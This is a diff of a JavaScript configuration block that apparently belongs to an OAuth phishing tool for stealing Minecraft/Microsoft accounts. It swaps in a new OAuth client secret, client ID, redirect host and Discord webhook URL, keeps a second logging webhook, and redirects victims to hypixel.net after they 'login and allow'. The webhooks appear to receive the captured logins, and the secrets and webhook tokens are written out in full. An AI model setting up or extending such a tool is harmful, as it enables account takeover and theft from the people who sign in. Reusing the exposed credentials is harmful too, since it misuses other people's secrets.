@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'Bh48Q~WlgsMZIrkwobiASVzqWzT1sYwKwlKOJbZH' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '76872384-d348-4167-b81d-c9d0180b9bc9'
-const redirect_uri = 'https://skyhelperdev.onrender.com'
-const webhook_url = 'https://discordapp.com/api/webhooks/1051279195893923910/nZSNCluCSxlLnbfxvzqRpmgilWRu34BliwtCJNjbsrS-rmLh3KCgswACfEzmSRAfDiQM	'
+const client_secret = 'bxJ8Q~xFTDzsMvE.7fEPkOJBQwpZSzDV4O9bsdjo' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'e2fb820e-0cc5-4902-8866-dde3794f9e81'
+const redirect_uri = 'https://uzmicauth.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1051722653028859915/7zcycQvduZd3xNi2znvgPlt1Xbym3bdQsTfU-iji6mpZwkqzN3k2wOfEoK5tFHruhUH5'
 const webhook_log = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 //Requirements
